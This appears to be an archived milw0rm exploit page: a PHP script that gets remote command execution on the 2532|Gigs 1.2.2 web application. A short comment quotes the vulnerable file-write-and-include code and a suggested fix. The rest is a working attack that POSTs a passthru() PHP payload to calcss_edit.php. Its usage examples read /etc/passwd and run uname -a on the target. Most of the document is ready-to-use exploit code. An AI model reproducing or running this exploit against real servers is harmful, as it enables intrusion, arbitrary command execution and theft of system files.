<html><head><title>2532|Gigs 1.2.2 Stable Remote Command Execution Exploit</title></head><pre>&lt;?php


/* ----------------------------------------------------------------
 * 2532|Gigs 1.2.2 Stable Remote Command Execution Exploit
 * ----------------------------------------------------------------
 * by athos - staker[at]hotmail[dot]it 
 * works regardless php.ini settings
 * http://www.hotscripts.com/jump.php?listing_id=65863&amp;jump_type=1
 * ----------------------------------------------------------------
 * Code Details (calcss_edit.php)
 *  
 * 1. &lt;?php
 * 2. ...
 * 12. sleep(2);
 * 13. $id = $_POST[&quot;id&quot;];
 * 14. $content = $_POST[&quot;content&quot;];
 * 15. //lets write the updated CSS file
 * 16. $filename = &quot;css/calendar.css&quot;;
 * 17. $theText = stripslashes($content);
 * 18. $data = fopen($filename, &quot;w&quot;);
 * 19. fwrite($data,$content);
 * 20. fclose($data);
 * 21. // display the new css file
 * 22. include(&quot;css/calendar.css&quot;);
 * 23 ?&gt;
 * ----------------------------------------------------------------
 * Fix
 * 
 * &lt;?php
 * 
 * if(eregi('calcss_edit.php',$_SERVER['PHP-SELF']))
 * {
 *      die(&quot;Access Not Allowed&quot;);
 * }
 * 
 * ...
 * ?&gt;
 * 
 */



error_reporting(0);

$host = explode('/',$argv[1]);
$exec = $argv[2] or usage();


$sock = fsockopen($host[0],80);

$post = &quot;content=&lt;?php passthru('{$exec}');?&gt;&quot;;
$leng = strlen($post);

$data = &quot;POST /{$host[1]}/calcss_edit.php HTTP/1.1\r\n&quot;.
        &quot;Host: {$host[0]}\r\n&quot;.
        &quot;User-Agent: Lynx (textmode)\r\n&quot;.
        &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;.
        &quot;Accept-Encoding: text/plain\r\n&quot;.
        &quot;Content-Length: {$leng}\r\n\r\n{$post}\r\n\r\n&quot;;

fputs($sock,$data);

while(!feof($sock)) {
$html .= fgets($sock);
} fclose($sock);

echo $html; 



function usage() {


print_r('
-------------------------------------------------------
2532|Gigs 1.2.2 Stable Remote Command Execution Exploit
-------------------------------------------------------
by athos - staker[at]hotmail[dot]it
works regardless php.ini settings

Usage: php xpl.php [host/path] [command]
       php xpl.php localhost/cms cat ../../../etc/passwd
       php xpl.php localhost/cms &quot;uname -a&quot;
       
'); exit(0);



}


?&gt;

# milw0rm.com [2008-12-18]</pre></html>